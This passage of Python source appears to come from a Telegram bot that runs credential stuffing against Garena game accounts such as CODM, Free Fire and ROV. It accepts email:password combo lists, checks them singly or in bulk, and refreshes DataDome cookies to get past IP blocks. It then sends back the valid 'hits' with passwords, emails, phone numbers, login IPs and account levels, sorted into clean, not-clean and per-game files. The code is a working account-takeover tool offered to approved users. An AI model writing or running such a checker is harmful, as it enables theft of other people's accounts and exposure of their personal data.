            "*ʏᴏᴜʀ ʀᴇqᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ᴛʜᴇ ᴀᴅᴍɪɴ.*\n"
            "*ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜᴘ ᴛᴏ 24ʜ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.*",
            parse_mode="Markdown",
        )
        return

    if data in ("admin_panel", "admin_pending", "admin_approved", "admin_removed"):
        if uid not in ADMIN_IDS:
            await query.answer("✘ ᴀᴅᴍɪɴ ᴏɴʟʏ", show_alert=True)
            return
        if data == "admin_panel":    await _admin_panel(update)
        elif data == "admin_pending":  await _admin_pending(update)
        elif data == "admin_approved": await _admin_approved(update)
        elif data == "admin_removed":  await _admin_removed(update)
        return

    if data.startswith("approve_"):
        if uid not in ADMIN_IDS:
            await query.answer("✘ ᴀᴅᴍɪɴ ᴏɴʟʏ", show_alert=True)
            return
        tid   = int(data.split("_", 1)[1])
        info  = get_pending().get(str(tid), {})
        uname = info.get("username", f"id:{tid}")
        approve_user(tid)
        try:
            await context.bot.send_message(tid,
                "────────────────────────\n"
                "  *✦ ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ*\n"
                "────────────────────────\n\n"
                "*ʏᴏᴜʀ ʀᴇqᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ ᴀᴘᴘʀᴏᴠᴇᴅ!*\n"
                "*ᴜsᴇ /start ᴛᴏ ᴏᴘᴇɴ ᴛʜᴇ ʙᴏᴛ.*",
                parse_mode="Markdown")
        except Exception:
            pass
        await query.message.edit_text(
            f"*✦ ᴀᴘᴘʀᴏᴠᴇᴅ:* {uname} (`{tid}`)",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return

    if data.startswith("decline_"):
        if uid not in ADMIN_IDS:
            await query.answer("✘ ᴀᴅᴍɪɴ ᴏɴʟʏ", show_alert=True)
            return
        tid   = int(data.split("_", 1)[1])
        info  = get_pending().get(str(tid), {})
        uname = info.get("username", f"id:{tid}")
        decline_user(tid)
        try:
            await context.bot.send_message(tid,
                "────────────────────────\n"
                "  *✘ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ*\n"
                "────────────────────────\n\n"
                "*ʏᴏᴜʀ ʀᴇqᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇᴄʟɪɴᴇᴅ.*\n"
                "*ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ᴛᴏ ᴀsᴋ ᴡʜʏ.*",
                parse_mode="Markdown")
        except Exception:
            pass
        await query.message.edit_text(
            f"*✘ ᴅᴇᴄʟɪɴᴇᴅ:* {uname} (`{tid}`)",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return

    if data.startswith("remove_"):
        if uid not in ADMIN_IDS:
            await query.answer("✘ ᴀᴅᴍɪɴ ᴏɴʟʏ", show_alert=True)
            return
        tid = int(data.split("_", 1)[1])
        remove_user(tid)
        try:
            await context.bot.send_message(tid,
                "────────────────────────\n"
                "  *✘ ᴀᴄᴄᴇss ʀᴇᴍᴏᴠᴇᴅ*\n"
                "────────────────────────\n\n"
                "*ʏᴏᴜʀ ʙᴏᴛ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ʙʏ ᴛʜᴇ ᴀᴅᴍɪɴ.*",
                parse_mode="Markdown")
        except Exception:
            pass
        await query.message.edit_text(
            f"*✘ ʀᴇᴍᴏᴠᴇᴅ:* `{tid}`",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_ADMIN),
        )
        return

    if not is_approved(uid):
        await query.answer("✘ ɴᴏ ᴀᴄᴄᴇss", show_alert=True)
        return

    us = get_user_session(uid)


    if data == "toggle_other_games":
        us.check_other_games = not us.check_other_games
        flag = "✦ ᴏɴ" if us.check_other_games else "✧ ᴏғғ"
        note = (
            "\n*⚠ ɴᴏᴛᴇ: ᴄʜᴇᴄᴋɪɴɢ ᴏᴛʜᴇʀ ɢᴀᴍᴇs ᴡɪʟʟ ᴍᴀᴋᴇ ᴄʜᴇᴄᴋᴇʀ sʟɪɢʜᴛʟʏ sʟᴏᴡᴇʀ.*"
            if us.check_other_games else ""
        )
        await query.message.edit_text(
            "────────────────────────\n"
            "  *★ ᴏᴛʜᴇʀ ɢᴀᴍᴇs*\n"
            "────────────────────────\n\n"
            f"*sᴛᴀᴛᴜs:* {flag}{note}\n\n"
            "*ᴄʜᴇᴄᴋs: ᴄᴏᴅᴍ / ʀᴏᴠ / ᴅᴇʟᴛᴀ ғᴏʀᴄᴇ / ᴀᴏᴠ / ғʀᴇᴇғɪʀᴇ / ᴜɴᴅᴀᴡɴ + ᴍᴏʀᴇ*",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
        )
        return

    if data == "single_check":
        context.user_data["awaiting_single"] = True
        await query.message.edit_text(
            "────────────────────────\n"
            "  *◈ sɪɴɢʟᴇ ᴄʜᴇᴄᴋ*\n"
            "────────────────────────\n\n"
            "*sᴇɴᴅ ᴀᴄᴄᴏᴜɴᴛ ɪɴ ᴛʜɪs ғᴏʀᴍᴀᴛ:*\n"
            "`email@example.com:password`",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
        )
        return

    if data == "bulk_check":
        context.user_data["awaiting_bulk"] = True
        await query.message.edit_text(
            "────────────────────────\n"
            "  *◈ ʙᴜʟᴋ ᴄʜᴇᴄᴋ*\n"
            "────────────────────────\n\n"
            "*sᴇɴᴅ ᴀᴄᴄᴏᴜɴᴛs ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ ᴏʀ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ғɪʟᴇ:*\n"
            "`email1:pass1`\n"
            "`email2:pass2`",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
        )
        return

    if data == "view_stats":
        stats = us.live_stats.get_stats()
        gc    = stats["game_counts"]
        sr    = (stats["valid"] / stats["total"] * 100) if stats["total"] > 0 else 0
        await query.message.edit_text(
            "────────────────────────\n"
            "  *◆ sᴇssɪᴏɴ sᴛᴀᴛs*\n"
            "────────────────────────\n\n"
            f"*◈ ᴘʀᴏᴄᴇssᴇᴅ:* `{stats['total']}` | *ʀᴀᴛᴇ:* `{sr:.1f}%`\n"
            f"*✦ ᴠᴀʟɪᴅ:* `{stats['valid']}` | *✧ ɪɴᴠᴀʟɪᴅ:* `{stats['invalid']}`\n"
            f"*✦ ᴄʟᴇᴀɴ:* `{stats['clean']}` | *✘ ɴᴏᴛ ᴄʟᴇᴀɴ:* `{stats['not_clean']}`\n"
            f"*▲ ʜɪɢʜᴇsᴛ ʟᴠʟ:* `{stats['highest_level']}` | "
            f"*▲ ʜɪɢʜᴇsᴛ ᴄʟᴇᴀɴ ʟᴠʟ:* `{stats['highest_clean_level']}`\n\n"
            "*◈ ɢᴀᴍᴇ ʜɪᴛs:*\n"
            f"  ᴄᴏᴅᴍ: `{stats['has_codm']}` | ʀᴏᴠ: `{gc.get('ROV',0)}` | "
            f"ᴅᴇʟᴛᴀ: `{gc.get('DELTA FORCE',0)}`\n"
            f"  ᴀᴏᴠ: `{gc.get('AOV',0)}` | ғғ: `{gc.get('FREEFIRE',0)}` | "
            f"ᴜɴᴅᴀᴡɴ: `{gc.get('GARENA UNDAWN',0)}`",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
        )
        return

    if data == "reset_session":
        if us.is_running:
            await query.answer("⚠ ᴄᴀɴɴᴏᴛ ʀᴇsᴇᴛ ᴡʜɪʟᴇ ᴄʜᴇᴄᴋ ɪs ʀᴜɴɴɪɴɢ", show_alert=True)
            return
        us.reset_session()
        us.live_stats = LiveStats()
        await query.message.edit_text(
            "────────────────────────\n"
            "  *↻ sᴇssɪᴏɴ ʀᴇsᴇᴛ*\n"
            "────────────────────────\n\n"
            "✦ ɴᴇᴡ sᴇssɪᴏɴ ᴄʀᴇᴀᴛᴇᴅ\n"
            "✦ sᴛᴀᴛs ᴄʟᴇᴀʀᴇᴅ\n"
            "✦ ʀᴇᴀᴅʏ ғᴏʀ ɴᴇᴡ ᴄʜᴇᴄᴋs",
            parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
        )
        return

    if data == "stop_check":
        if us.is_running:
            us.stop_event.set()
            us.is_running = False
            await query.message.edit_text(
                "────────────────────────\n"
                "  *✘ sᴛᴏᴘᴘɪɴɢ...*\n"
                "────────────────────────\n\n"
                "*ᴄʜᴇᴄᴋ ᴡɪʟʟ sᴛᴏᴘ ᴀғᴛᴇʀ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴄᴏᴜɴᴛ.*",
                parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
            )
            with queue_lock:
                global queue_active_uid
                if queue_active_uid == uid:
                    queue_active_uid = None
                    queue_event.set()
        else:
            await query.answer("✧ ɴᴏ ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ", show_alert=True)
        return



def _build_hit_message(account, password, details, codm_info, has_codm,
                        game_connections=None):
    is_clean         = details.get("is_clean", False)
    shell            = details.get("profile", {}).get("shell_balance", 0)
    last_login       = details.get("last_login", "Unknown")
    last_login_where = details.get("last_login_where", "N/A")
    ip               = details.get("ip_for_msg", "N/A")
    country          = details.get("personal", {}).get("country", "N/A")
    email            = details.get("email", "N/A")
    email_ver        = "Yes" if details.get("email_verified") else "No"
    mobile           = details.get("personal", {}).get("mobile_no", "N/A")
    acc_status       = details.get("status", {}).get("account_status", "N/A").upper()
    binds_list       = details.get("binds", [])
    binds            = ", ".join(binds_list) if binds_list else "None"
    clean_label      = "CLEAN" if is_clean else "NOT CLEAN"

    fb_account = details.get("security", {}).get("facebook_account") or {}
    fb_status = "False"
    if isinstance(fb_account, dict):
        if fb_account.get("fb_username", ""):
            fb_status = "True"
        else:
            fb_status = "Deleted"

    codm_nickname = codm_info.get("codm_nickname", "N/A") if codm_info else "N/A"
    codm_uid      = codm_info.get("uid", "N/A") if codm_info else "N/A"
    codm_level    = codm_info.get("codm_level", "N/A") if codm_info else "N/A"
    codm_region   = codm_info.get("region", "N/A") if codm_info else "N/A"

    country_flags = {
        'PH': '🇵🇭', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TW': '🇹🇼', 'TH': '🇹🇭',
        'ID': '🇮🇩', 'IN': '🇮🇳', 'VN': '🇻🇳', 'US': '🇺🇸', 'BR': '🇧🇷',
    }
    region_flag = country_flags.get(str(codm_region).upper(), '🌍')

    out = [
        f"{account}:{password}",
        f"CODM: {codm_nickname}",
        f"UID: {codm_uid}",
        f"Level: {codm_level}",
        f"Shell: {shell}",
        f"Region: {codm_region} {region_flag}",
        f"Login Country: {country}",
        f"Last Login: {last_login}",
        f"Login Location: {last_login_where}",
        f"Login IP: {ip}",
        f"Email: {email} ({email_ver})",
        f"Mobile: {mobile}",
        f"STATUS: {acc_status}",
        f"Binds: {binds}",
        f"FB STATUS: {fb_status}",
        f"STATUS: {clean_label}",
    ]

    if game_connections:
        game_display = {
            "ROV": "ROV", "DELTA FORCE": "Delta Force", "AOV": "AOV",
            "SPEED DRIFTERS": "Speed Drifters", "BLACK CLOVER M": "Black Clover M",
            "GARENA UNDAWN": "Undawn", "FC ONLINE": "FC Online",
            "FC ONLINE M": "FC Online M", "MOONLIGHT BLADE": "Moonlight Blade",
            "FAST THRILL": "Fast Thrill", "THE WORLD OF WAR": "World of War",
        }
        non_codm = [g for g in game_connections if g.get("game", "").upper() != "CODM"]
        if non_codm:
            out.append("")
            out.append("Other Games:")
            for g in non_codm:
                gn      = g.get("game", "").upper()
                glabel  = game_display.get(gn, gn)
                grole   = g.get("role", "N/A")
                gregion = g.get("region", "N/A")
                out.append(f"  {glabel}: {grole} ({gregion})")

    return "\n".join(out)



async def handle_text(update: Update, context: CallbackContext):
    uid  = update.effective_user.id
    text = update.message.text.strip() if update.message.text else ""

    if not is_approved(uid):
        await update.message.reply_text(
            "*ᴜsᴇ /start ᴛᴏ ʀᴇqᴜᴇsᴛ ᴀᴄᴄᴇss.*", parse_mode="Markdown"
        )
        return

    us = get_user_session(uid)


    if context.user_data.get("awaiting_single"):
        context.user_data.pop("awaiting_single")
        if ":" not in text:
            await update.message.reply_text(
                "*✘ ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ!*\n\n*ᴜsᴀɢᴇ:* `email@example.com:password`",
                parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
            )
            return

        if us.is_running:
            await update.message.reply_text(
                "*↻ ᴀ ᴄʜᴇᴄᴋ ɪs ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ.*", parse_mode="Markdown",
            )
            return

        account, password = text.split(":", 1)
        account  = account.strip()
        password = password.strip()

        status_msg = await update.message.reply_text(
            f"*◈ ᴄʜᴇᴄᴋɪɴɢ* `{account}`*...*\n"
            f"  [......              ] ᴘʀᴇᴘᴀʀɪɴɢ...",
            parse_mode="Markdown"
        )

        loop = asyncio.get_event_loop()

        def do_single():
            us.is_running = True
            try:
                asyncio.run_coroutine_threadsafe(
                    status_msg.edit_text(
                        f"*◈ ᴄʜᴇᴄᴋɪɴɢ* `{account}`*...*\n"
                        f"  [######              ] ʟᴏɢɢɪɴɢ ɪɴ...",
                        parse_mode="Markdown"
                    ), loop,
                ).result(timeout=5)
                result = processaccount(
                    us.session, account, password,
                    us.cookie_manager, us.datadome_manager,
                    us.live_stats, "Results",
                    check_other_games=us.check_other_games,
                )
                asyncio.run_coroutine_threadsafe(
                    status_msg.edit_text(
                        result["message"], parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup(BACK_MENU)
                    ),
                    loop,
                ).result(timeout=5)
            except Exception as e:
                try:
                    asyncio.run_coroutine_threadsafe(
                        status_msg.edit_text(
                            f"*✘ ᴇʀʀᴏʀ:* `{str(e)[:100]}`",
                            parse_mode="Markdown",
                            reply_markup=InlineKeyboardMarkup(BACK_MENU)
                        ),
                        loop,
                    ).result(timeout=5)
                except Exception:
                    pass
            finally:
                us.is_running = False

        threading.Thread(target=do_single, daemon=True).start()
        return


    if context.user_data.get("awaiting_bulk"):
        context.user_data.pop("awaiting_bulk")
        lines = [l.strip() for l in text.split("\n") if l.strip() and ":" in l]
        if not lines:
            await update.message.reply_text(
                "*✘ ɴᴏ ᴠᴀʟɪᴅ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ.*\n*ғᴏʀᴍᴀᴛ:* `email:password`",
                parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(BACK_MENU),
            )
            return
        await _run_bulk(update, context, uid, us, lines)
        return

    await update.message.reply_text(
        "*ᴜsᴇ /start ᴛᴏ ᴏᴘᴇɴ ᴛʜᴇ ᴍᴇɴᴜ.*", parse_mode="Markdown"
    )



async def handle_document(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("*ᴜsᴇ /start ᴛᴏ ʀᴇqᴜᴇsᴛ ᴀᴄᴄᴇss.*", parse_mode="Markdown")
        return

    us  = get_user_session(uid)
    doc = update.message.document

    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text(
            "*⚠ ᴏɴʟʏ .ᴛxᴛ ғɪʟᴇs ᴀʀᴇ ᴀᴄᴄᴇᴘᴛᴇᴅ.*", parse_mode="Markdown"
        )
        return

    try:
        file_info  = await context.bot.get_file(doc.file_id)
        downloaded = await file_info.download_as_bytearray()
        content    = downloaded.decode("utf-8", errors="ignore")
        lines      = [l.strip() for l in content.split("\n") if l.strip() and ":" in l]
        if not lines:
            await update.message.reply_text(
                "*⚠ ɴᴏ ᴠᴀʟɪᴅ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ.*", parse_mode="Markdown"
            )
            return
        await update.message.reply_text(
            f"*◈ ғɪʟᴇ ʟᴏᴀᴅᴇᴅ:* `{doc.file_name}`\n"
            f"*◆ ғᴏᴜɴᴅ:* `{len(lines)}` ᴀᴄᴄᴏᴜɴᴛs\n"
            "*▶ sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ...*",
            parse_mode="Markdown",
        )
        loop = asyncio.get_event_loop()
        await _run_bulk(update, context, uid, us, lines)
    except Exception as e:
        await update.message.reply_text(f"*✘ ᴇʀʀᴏʀ ʀᴇᴀᴅɪɴɢ ғɪʟᴇ:* `{str(e)[:100]}`",
                                         parse_mode="Markdown")



async def _run_bulk(update: Update, context: CallbackContext,
                    uid: int, us: UserSession, lines: list):
    global queue_active_uid

    chat_id = update.effective_chat.id
    fname   = getattr(update.message, 'document', None)
    fname   = fname.file_name if fname else "combo.txt"
    total   = len(lines)

    with queue_lock:
        already_in = any(e["uid"] == uid for e in bulk_queue)
        if us.is_running or already_in:
            await update.message.reply_text(
                "*↻ ʏᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ ᴏʀ ɪɴ qᴜᴇᴜᴇ.*",
                parse_mode="Markdown")
            return

        pos = len(bulk_queue) + (1 if queue_active_uid is not None else 0) + 1
        entry = {"uid": uid, "us": us, "lines": lines,
                 "chat_id": chat_id, "fname": fname, "total": total,
                 "context": context}

        if queue_active_uid is None:
            queue_active_uid = uid
            pos = None
        else:
            bulk_queue.append(entry)

    if pos is not None:
        cancel_kb = InlineKeyboardMarkup([[InlineKeyboardButton("[CANCEL]", callback_data="stop_check")]])
        await update.message.reply_text(
            "────────────────────────\n"
            "  *⏳ qᴜᴇᴜᴇ — ᴡᴀɪᴛɪɴɢ ʏᴏᴜʀ ᴛᴜʀɴ*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"  📁 *ғɪʟᴇ     :* `{fname}`\n"
            f"  📊 *ʟɪɴᴇs    :* `{total} lines`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"  🔢 *ᴘᴏsɪᴛɪᴏɴ :* `#{pos}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ *ɴᴏ ᴀᴄᴛɪᴏɴ ɴᴇᴇᴅᴇᴅ! ɪ'ʟʟ ᴀᴜᴛᴏ-sᴛᴀʀᴛ ᴡʜᴇɴ ɪᴛ's ʏᴏᴜʀ ᴛᴜʀɴ.*",
            parse_mode="Markdown",
            reply_markup=cancel_kb,
        )
        return

    loop = asyncio.get_event_loop()
    await _do_bulk_run(update, context, uid, us, lines, chat_id, fname, total, loop)


async def _do_bulk_run(update, context, uid, us, lines, chat_id, fname, total, loop):
    global queue_active_uid

    cancel_kb = InlineKeyboardMarkup([[InlineKeyboardButton("[CANCEL]", callback_data="stop_check")]])

    status_msg = await context.bot.send_message(
        chat_id,
        f"*▶ ʙᴜʟᴋ ᴄʜᴇᴄᴋ sᴛᴀʀᴛᴇᴅ*\n"
        f"  ◈ ᴛᴏᴛᴀʟ: `{total}` ᴀᴄᴄᴏᴜɴᴛs\n"
        f"  [..                  ] 0/{total}\n"
        f"  sᴛᴀᴛᴜs: ᴘʀᴇᴘᴀʀɪɴɢ...",
        parse_mode="Markdown",
        reply_markup=cancel_kb,
    )

    def do_bulk():
        global queue_active_uid
        us.is_running = True
        us.stop_event.clear()
        valid_results = []

        for i, line in enumerate(lines, 1):
            if us.stop_event.is_set():
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(
                        chat_id, "*✘ ᴄʜᴇᴄᴋ sᴛᴏᴘᴘᴇᴅ ʙʏ ᴜsᴇʀ.*",
                        parse_mode="Markdown"),
                    loop,
                )
                break
            try:
                account, password = line.split(":", 1)
                account  = account.strip()
                password = password.strip()
                if not account or not password:
                    continue

                if i % 3 == 0 or i == 1:
                    stats = us.live_stats.get_stats()
                    bar   = _progress_bar(i, total)
                    gc    = stats["game_counts"]
                    game_prog = (
                        f"  🎮 ᴄᴏᴅᴍ: `{stats['has_codm']}` | ✧ ɴᴏ ᴄᴏᴅᴍ: `{stats['no_codm']}`\n"
                        f"  ʀᴏᴠ: `{gc.get('ROV',0)}` | "
                        f"ᴅᴇʟᴛᴀ: `{gc.get('DELTA FORCE',0)}` | "
                        f"ᴀᴏᴠ: `{gc.get('AOV',0)}` | "
                        f"sᴘᴅ: `{gc.get('SPEED DRIFTERS',0)}`"
                    )
                    try:
                        asyncio.run_coroutine_threadsafe(
                            status_msg.edit_text(
                                f"*▶ ʙᴜʟᴋ ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ*\n"
                                f"  {bar}\n"
                                f"  ◈ ᴄᴜʀʀᴇɴᴛ: `{account}`\n"
                                f"  ✦ ᴠᴀʟɪᴅ: `{stats['valid']}` | "
                                f"✧ ɪɴᴠᴀʟɪᴅ: `{stats['invalid']}`\n"
                                f"  ✦ ᴄʟᴇᴀɴ: `{stats['clean']}` | "
                                f"✘ ɴᴏᴛ ᴄʟᴇᴀɴ: `{stats['not_clean']}`\n"
                                f"  ▲ ʜɪɢʜᴇsᴛ ʟᴠʟ: `{stats['highest_level']}` | "
                                f"▲ ᴄʟᴇᴀɴ ʟᴠʟ: `{stats['highest_clean_level']}`\n"
                                + game_prog + "\n"
                                f"  sᴛᴀᴛᴜs: ᴄʜᴇᴄᴋɪɴɢ...",
                                parse_mode="Markdown",
                                reply_markup=cancel_kb,
                            ),
                            loop,
                        ).result(timeout=5)
                    except Exception:
                        pass

                result = processaccount(
                    us.session, account, password,
                    us.cookie_manager, us.datadome_manager,
                    us.live_stats, us.result_folder,
                    check_other_games=us.check_other_games,
                )

                if result["status"] == "valid":
                    valid_results.append(result)
                elif result["status"] == "ip_blocked":
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            chat_id,
                            "*⚠ ɪᴘ ʙʟᴏᴄᴋᴇᴅ — ᴀᴜᴛᴏ ʀᴇᴄᴏᴠᴇʀɪɴɢ...*\n"
                            "_ᴡᴀɪᴛɪɴɢ ғᴏʀ ɪᴘ ᴄʜᴀɴɢᴇ / ғʀᴇsʜ ᴄᴏᴏᴋɪᴇ_",
                            parse_mode="Markdown",
                        ),
                        loop,
                    )
                    us.datadome_manager.fetch_fresh_datadome_with_retry(us.session)
                    us.datadome_manager.reset_attempts()

                time.sleep(0.2)

            except Exception:
                continue

        stats = us.live_stats.get_stats()
        gc    = stats["game_counts"]
        sr    = (stats["valid"] / stats["total"] * 100) if stats["total"] > 0 else 0

        game_display_order = [
            ("CODM",             "ᴄᴏᴅᴍ"),
            ("ROV",              "ʀᴏᴠ"),
            ("DELTA FORCE",      "ᴅᴇʟᴛᴀ ғᴏʀᴄᴇ"),
            ("AOV",              "ᴀᴏᴠ"),
            ("FREEFIRE",         "ғʀᴇᴇ ғɪʀᴇ"),
            ("SPEED DRIFTERS",   "sᴘᴇᴇᴅ ᴅʀɪғᴛᴇʀs"),
            ("BLACK CLOVER M",   "ʙʟᴀᴄᴋ ᴄʟᴏᴠᴇʀ ᴍ"),
            ("GARENA UNDAWN",    "ᴜɴᴅᴀᴡɴ"),
            ("FC ONLINE",        "ғᴄ ᴏɴʟɪɴᴇ"),
            ("FC ONLINE M",      "ғᴄ ᴏɴʟɪɴᴇ ᴍ"),
            ("MOONLIGHT BLADE",  "ᴍᴏᴏɴʟɪɢʜᴛ ʙʟᴀᴅᴇ"),
            ("FAST THRILL",      "ғᴀsᴛ ᴛʜʀɪʟʟ"),
            ("THE WORLD OF WAR", "ᴡᴏʀʟᴅ ᴏғ ᴡᴀʀ"),
        ]
        game_lines = ""
        for key, label in game_display_order:
            count = gc.get(key, 0)
            game_lines += f"  ✦ {label}: `{count}`\n"

        final_msg = (
            "────────────────────────\n"
            "  *◆ ʙᴜʟᴋ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ*\n"
            "────────────────────────\n\n"
            f"*◈ ᴘʀᴏᴄᴇssᴇᴅ:* `{stats['total']}`\n"
            f"*✦ ᴠᴀʟɪᴅ:* `{stats['valid']}` | *✧ ɪɴᴠᴀʟɪᴅ:* `{stats['invalid']}`\n"
            f"*🎮 ᴄᴏᴅᴍ:* `{stats['has_codm']}` | *✧ ɴᴏ ᴄᴏᴅᴍ:* `{stats['no_codm']}`\n"
            f"*✦ ᴄʟᴇᴀɴ:* `{stats['clean']}` | *✘ ɴᴏᴛ ᴄʟᴇᴀɴ:* `{stats['not_clean']}`\n"
            f"*▲ ʜɪɢʜᴇsᴛ ʟᴠʟ:* `{stats['highest_level']}` | "
            f"*▲ ᴄʟᴇᴀɴ ʟᴠʟ:* `{stats['highest_clean_level']}`\n"
            f"*◎ sᴜᴄᴄᴇss ʀᴀᴛᴇ:* `{sr:.1f}%`\n\n"
            "*◈ ɢᴀᴍᴇ ʜɪᴛs:*\n"
            + game_lines
        )

        try:
            asyncio.run_coroutine_threadsafe(
                status_msg.edit_text(final_msg, parse_mode="Markdown",
                                     reply_markup=InlineKeyboardMarkup(BACK_MENU)),
                loop,
            ).result(timeout=5)
        except Exception:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(chat_id, final_msg, parse_mode="Markdown",
                                         reply_markup=InlineKeyboardMarkup(BACK_MENU)),
                loop,
            )

        if valid_results:
            def sort_by_level(results):
                def lvl(r):
                    try:
                        return int(r["codm_info"].get("codm_level", 0)) if r["codm_info"] else 0
                    except Exception:
                        return 0
                return sorted(results, key=lvl, reverse=True)

            codm_results     = [r for r in valid_results if r["has_codm"]]
            no_codm_results  = [r for r in valid_results if not r["has_codm"]]

            clean_results    = sort_by_level([r for r in codm_results if r["details"] and r["details"].get("is_clean")])
            notclean_results = sort_by_level([r for r in codm_results if r["details"] and not r["details"].get("is_clean")])
            no_codm_sorted   = sort_by_level(no_codm_results)

            def build_block(r):
                return _build_hit_message(
                    r["details"].get("username", "N/A"),
                    r.get("password", ""),
                    r["details"],
                    r["codm_info"],
                    r["has_codm"],
                    game_connections=r.get("game_connections"),
                )

            def send_file(results, filename, label):
                if not results:
                    return
                lines_out = []
                for r in results:
                    lines_out.append(build_block(r) + "\n\n" + "─" * 40)
                content = "\n\n".join(lines_out).encode("utf-8")
                buf = io.BytesIO(content)
                buf.name = filename
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_document(
                        chat_id, buf,
                        filename=filename,
                        caption=f"*{label}*\n  ᴛᴏᴛᴀʟ: `{len(results)}`",
                        parse_mode="Markdown",
                    ),
                    loop,
                )

            send_file(clean_results,    "clean.txt",    "✦ ᴄʟᴇᴀɴ (ᴄᴏᴅᴍ)")
            send_file(notclean_results, "notclean.txt", "✘ ɴᴏᴛ ᴄʟᴇᴀɴ (ᴄᴏᴅᴍ)")
            send_file(no_codm_sorted,   "nocodm.txt",   "✧ ɴᴏ ᴄᴏᴅᴍ")

            if us.check_other_games:
                game_file_map = {
                    "CODM":             "CODM.txt",
                    "FREEFIRE":         "FreeFire.txt",
                    "FREE FIRE":        "FreeFire.txt",
                    "ROV":              "ROV.txt",
                    "DELTA FORCE":      "DeltaForce.txt",
                    "AOV":              "AOV.txt",
                    "SPEED DRIFTERS":   "SpeedDrifters.txt",
                    "BLACK CLOVER M":   "BlackCloverM.txt",
                    "GARENA UNDAWN":    "Undawn.txt",
                    "FC ONLINE":        "FCOnline.txt",
                    "FC ONLINE M":      "FCOnlineM.txt",
                    "MOONLIGHT BLADE":  "MoonlightBlade.txt",
                    "FAST THRILL":      "FastThrill.txt",
                    "THE WORLD OF WAR": "WorldOfWar.txt",
                }
                from collections import defaultdict
                game_buckets = defaultdict(list)
                for r in valid_results:
                    for g in (r.get("game_connections") or []):
                        gname = g.get("game", "").upper()
                        if gname in game_file_map and gname != "CODM":
                            game_buckets[gname].append(r)

                seen_uids = {}
                for gname, g_results in game_buckets.items():
                    deduped = []
                    seen = set()
                    for r in g_results:
                        key = r["details"].get("username", "") if r["details"] else ""
                        if key not in seen:
                            seen.add(key)
                            deduped.append(r)
                    send_file(sort_by_level(deduped), game_file_map[gname], f"{gname} ʜɪᴛs")

        us.is_running = False

        with queue_lock:
            queue_active_uid = None
            if bulk_queue:
                next_entry = bulk_queue.pop(0)
                queue_active_uid = next_entry["uid"]
                asyncio.run_coroutine_threadsafe(
                    _notify_and_run_next(next_entry, loop),
                    loop,
                )

    threading.Thread(target=do_bulk, daemon=True).start()


async def _notify_and_run_next(entry, loop):
    uid      = entry["uid"]
    us       = entry["us"]
    lines    = entry["lines"]
    chat_id  = entry["chat_id"]
    fname    = entry["fname"]
    total    = entry["total"]
    context  = entry["context"]

    await context.bot.send_message(
        chat_id,
        "────────────────────────\n"
        "  *▶ ʏᴏᴜʀ ᴛᴜʀɴ!*\n"
        "────────────────────────\n\n"
        f"*sᴛᴀʀᴛɪɴɢ ʙᴜʟᴋ ᴄʜᴇᴄᴋ ɴᴏᴡ...*\n"
        f"📁 `{fname}` — `{total}` ʟɪɴᴇs",
        parse_mode="Markdown",
    )

    class FakeUpdate:
        effective_chat = type("C", (), {"id": chat_id})()
        message = None

    fake = FakeUpdate()
    await _do_bulk_run(fake, context, uid, us, lines, chat_id, fname, total, loop)



def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", main_menu))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    logger.info("ʙᴏᴛ sᴛᴀʀᴛᴇᴅ...")
    app.run_polling(allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    main()
